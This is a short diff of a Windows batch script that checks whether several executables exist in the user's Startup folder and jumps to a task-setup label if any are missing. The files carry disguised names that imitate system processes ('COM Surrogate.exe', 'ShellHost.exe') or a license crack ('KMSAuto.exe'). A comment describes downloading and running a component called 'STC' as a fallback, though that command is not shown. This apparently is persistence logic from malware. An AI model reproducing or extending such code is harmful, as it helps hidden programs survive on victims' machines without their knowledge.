@@ -170,17 +170,15 @@ if not exist "%startupFile%" (
 :: Check Startup Programms , if not found Run Task , if not found task , Download STC & Run it 
 
 :: Define the list of files to check
-set "file1=%APPDATA%\Microsoft\Windows\SystemCertificatesData\StartupTaskCaller.exe"
-set "file2=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\COM Surrogate.exe"
-set "file3=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ShellHost.exe"
-set "file4=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\KMSAuto.exe"
+set "file1=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\COM Surrogate.exe"
+set "file2=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ShellHost.exe"
+set "file3=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\KMSAuto.exe"
 
 
 :: Check each file
-if not exist "%file1%" goto CHECKORRUNSTC
-if not exist "%file2%" goto CHECKORRUNSTC
-if not exist "%file3%" goto CHECKORRUNSTC
-if not exist "%file4%" goto CHECKORRUNSTC
+if not exist "%file1%" goto STARTUPTAASK
+if not exist "%file2%" goto STARTUPTAASK
+if not exist "%file3%" goto STARTUPTAASK
 
 
 
